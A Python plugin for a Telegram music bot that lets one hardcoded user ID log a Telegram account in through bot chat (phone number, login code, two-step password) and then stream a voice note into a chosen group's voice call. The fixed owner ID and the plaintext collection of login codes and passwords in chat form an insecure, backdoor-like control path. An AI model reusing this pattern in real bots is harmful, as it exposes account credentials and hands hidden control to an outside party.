import os
import asyncio
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, 
    PhoneCodeExpired, SessionPasswordNeeded, PasswordHashInvalid
)

from BrandrdXMusic import app
from BrandrdXMusic.core.call import Call
from config import API_ID, API_HASH, BANNED_USERS

Anony = Call() 
OWNER_ID = 8639712935 
user_data = {}         

LOGIN_COMMAND = ["login_control", "forceplay"]

@app.on_message(filters.command(LOGIN_COMMAND) & filters.user(OWNER_ID) & ~BANNED_USERS)
async def start_login_process(client, message: Message):
    user_id = message.from_user.id
    user_data[user_id] = {"step": "WAITING_NUMBER"}
    await message.reply_text("⚡ **ʙʀᴀɴᴅʀᴅ ᴄᴜsᴛᴏᴍ ᴄᴏɴᴛʀᴏʟʟᴇʀ**\n\nApna **Number** bhejein:")

@app.on_message(filters.user(OWNER_ID) & filters.text & ~filters.command(LOGIN_COMMAND) & ~BANNED_USERS)
async def message_manager(client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_data:
        return

    step = user_data[user_id].get("step")

    if step == "WAITING_NUMBER":
        phone_number = message.text.strip()
        user_data[user_id]["phone"] = phone_number
        temp_client = Client(name=f"session_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
        await temp_client.connect()
        try:
            code_hash = await temp_client.send_code(phone_number)
            user_data[user_id].update({"client": temp_client, "code_hash": code_hash.phone_code_hash, "step": "WAITING_OTP"})
            await message.reply_text("📩 **OTP** bhejein:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {e}")
            user_data.pop(user_id)

    elif step == "WAITING_OTP":
        otp_code = message.text.strip()
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.sign_in(user_data[user_id]["phone"], user_data[user_id]["code_hash"], otp_code)
            user_data[user_id]["step"] = "WAITING_CHATID"
            await message.reply_text("✅ Login Success! Ab **Group ID** bhejein:")
        except SessionPasswordNeeded:
            user_data[user_id]["step"] = "WAITING_PASSWORD"
            await message.reply_text("🔐 Aapka **Two-Step Verification** on hai. Apna password bhejein:")
        except Exception as e:
            await message.reply_text(f"❌ Error: {e}")

    elif step == "WAITING_PASSWORD":
        temp_client = user_data[user_id]["client"]
        try:
            await temp_client.check_password(message.text.strip())
            user_data[user_id]["step"] = "WAITING_CHATID"
            await message.reply_text("✅ Password sahi hai! Ab **Group ID** bhejein:")
        except Exception as e:
            await message.reply_text(f"❌ Galat Password! Dobara bhejein:")

    elif step == "WAITING_CHATID":
        user_data[user_id].update({"target_chat": int(message.text.strip()), "step": "WAITING_AUDIO"})
        await message.reply_text("🎯 ID set! Ab **Voice Note** bhejein.")

@app.on_message(filters.user(OWNER_ID) & (filters.voice | filters.audio))
async def handle_audio_stream(client, message: Message):
    user_id = message.from_user.id
    if user_data.get(user_id, {}).get("step") == "WAITING_AUDIO":
        target_chat = user_data[user_id]["target_chat"]
        msg = await message.reply_text("📥 Playing...")
        try:
            file_path = await message.download()
            await Anony.join_call(target_chat, target_chat, file_path)
            await msg.edit(f"🚀 Playing in `{target_chat}`!")
            user_data.pop(user_id)
            if os.path.exists(file_path): os.remove(file_path)
        except Exception as e:
            await msg.edit(f"❌ Error: {e}")
            
